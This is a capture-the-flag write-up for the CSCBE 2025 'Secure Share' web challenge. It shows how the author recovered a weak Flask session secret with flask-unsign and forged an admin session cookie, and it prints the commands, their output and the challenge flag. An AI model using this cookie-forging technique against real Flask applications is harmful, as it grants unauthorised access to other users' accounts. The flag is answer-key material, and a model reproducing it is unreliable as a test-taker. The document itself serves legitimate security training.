# Secure Share – CSCBE 2025

## Category  
Web

## Description  
Welcome to SecureShare, TechCorp's internal employee directory.  
Access your profile and view other employees' profiles securely.

Challenge files: `source.zip`  
Access the server: http://secure_share.challenges.cybersecuritychallenge.be

## Scenario  
TechCorp uses a Flask-based web app to allow employees to view their profiles. Authentication is managed via cookies signed with a secret key. But something about the way the sessions are handled doesn’t seem very... secure.

## Write-up  
After launching the challenge, I noticed that the session was handled using Flask cookies. Here's an example of the session cookie:

```
eyJ1c2VyX2lkIjo2fQ.Z9QNyw.yuxTmc84bXUUQf1a67138P5-U-Y
```

This is a **Flask session cookie**, which contains:
- The payload (base64 JSON-encoded)
- A timestamp
- A signature (HMAC)

To forge this cookie, I needed the **secret key** used to sign it. I tried guessing common keys like `secret`, `supersecretkey`, etc.

I used [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) to brute-force or decode the cookie:

```bash
flask-unsign -u -c "eyJ1c2VyX2lkIjo2fQ.Z9QNyw.yuxTmc84bXUUQf1a67138P5-U-Y"
```

Output:
```
Found secret key: supersecretkey
```

With the secret key in hand, I forged a new cookie for the admin account (user_id 3 is usually the admin):

```bash
flask-unsign -s -c "{'user_id': 3}" --secret "supersecretkey"
```

I then replaced my browser cookie with the forged one and refreshed the page.

The profile page now showed the **admin profile**, and the flag was revealed.

## Solve script  
No script needed — I solved it using the command line:

```bash
# Unsigned to retrieve the key
flask-unsign -u -c "<original_cookie>"

# Sign a new cookie with admin privileges
flask-unsign -s -c "{'user_id': 3}" --secret "supersecretkey"
```

## Flag  
```
CSC{ID0R_1s_N0t_S0_S3cur3_4ft3r_4ll}
```
